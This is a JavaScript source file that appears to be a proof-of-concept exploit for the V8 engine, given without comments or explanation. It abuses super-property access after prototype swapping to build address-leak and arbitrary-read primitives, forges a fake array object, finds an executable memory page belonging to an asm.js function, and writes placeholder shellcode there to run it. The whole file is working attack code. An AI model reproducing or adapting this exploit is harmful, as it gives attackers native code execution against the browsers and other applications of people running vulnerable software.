const H = new class {
    constructor() {
        const ab = new ArrayBuffer(8)
        this.u32a = new Uint32Array(ab)
        this.d64a = new Float64Array(ab)
    }
    i2d(low, high=0) {
        this.u32a[0] = low
        this.u32a[1] = high
        return this.d64a[0]
    }
    d2i(d) {
        this.d64a[0] = d
        return [this.u32a[0], this.u32a[1]]
    }
}

function leak_addrof_elements() {
    class O extends Object {
        constructor() {
            super()
            this.x0 = this
            this[0] = 0x41424344 / 2
            this[1] = 0x45464748 / 2
        }
        m() {
            return super.length
        }
    }

    const o = new O()

    function f() {
        const proto = new String("a")
        O.prototype.__proto__ = proto
        proto.length
        return o.m()
    }

    for (var i = 0; i < 0x100; ++i) {
        const value = f()
        if (value !== 1) {
            return [o, value-1]
        }
    }
}

const [o, o_fa_addr] = leak_addrof_elements()

const [read, addrof] = (function () {
    class A extends Array {
        constructor() {
            super(1, 2)
        }
        m() {
            return super.length
        }
    }
    const a = new A()
    function f() {
        const proto = new String("a")
        A.prototype.__proto__ = proto
        proto.length
        return a.m()
    }

    for (let i = 0; i < 0x100; ++i) {
        const value = f()
        if (value !== 1) {
            break
        }
    }

    function read(addr) {
        a.length = (addr - 8) / 2
        const l3 = f(0)
        a.length = (addr - 8 + 2) / 2
        const h3 = f(0)
        return ((h3 << 8) & 0xff000000) + (l3 >> 8)
    }

    function addrof(obj) {
        o[0] = obj
        return read(o_fa_addr + 8) - 1
    }


    return [read, addrof]
}())


const shellcode = [0x90909090, 0x90909090, 0xcccccccc, 0x90909090]
function Module() {
    "use asm"
    function f() {}
    return {f: f}
}

const da = [
    1,1, 1.1,
    2.2, 2.2,
    3.3, 3.3,
    4.4, 4.4
]
const da_helper = [1.1]
const oa_helper = [{x: 0x41414142/2}]
const buf_helper = new ArrayBuffer(0x100)
const dv_helper = new DataView(buf_helper)
for (let i = 0; i < 0x100/4; ++i) {
    dv_helper.setUint32(i*4, 0x41414100 + i)
}

const da_addr = addrof(da)
const da_elements_addr = da_addr - 0x50
const da_map = read(da_addr)

const map_map = read(da_map-1)

const fake_array_addr = da_elements_addr + 0x28
const fake_elements_addr = da_elements_addr + 0x38

da[0] = H.i2d((map_map&0xffffff)<<8, (map_map>>24) & 0xff)
da[1] = H.i2d(0)
da[2] = H.i2d(((fake_array_addr+1)&0xffffff)<<8, ((fake_array_addr+1)>>24))
da[3] = H.i2d(0)
da[4] = H.i2d(da_map)
da[5] = H.i2d(fake_elements_addr+1, 0x1000)
da[6]

const fake_array = (function () {
    class A extends Array {
        constructor() {
            super(1, 2, 3, 4)
            this.x1 = 0x41414142 / 2
            this.x2 = 0x42424242 / 2
            this.x3 = 0x43434344 / 2
            this.x4 = (da_elements_addr + 8 + 2) / 2
        }
        m() {
            return super.prototype
        }
    }

    const a = new A()

    function f() {
        const proto = function () {}
        A.prototype.__proto__ = proto
        proto.prototype
        return a.m()
    }

    for (var i = 0; i < 0x100; ++i) {
        const value = f()
        if (value.length !== undefined) {
            return value
        }
    }
}())

function arb_read(addr) {
    fake_array[7] = H.i2d(addr-0x8+1, 0x5)
    return H.d2i(da_helper[0])
}

function arb_write() {
    //
}


const evil_func = Module().f
evil_func()

const evil_func_addr = addrof(evil_func)
const shared_info_addr = arb_read(evil_func_addr + 0xc)[0]-1
const [rwx_l, rwx_h] = arb_read(shared_info_addr - 0xb8)

fake_array[19] = H.i2d(0, rwx_l)
fake_array[20] = H.i2d(rwx_h, 0)
shellcode.forEach((v, i) => {
    dv_helper.setUint32(i*4, v)
})

evil_func()
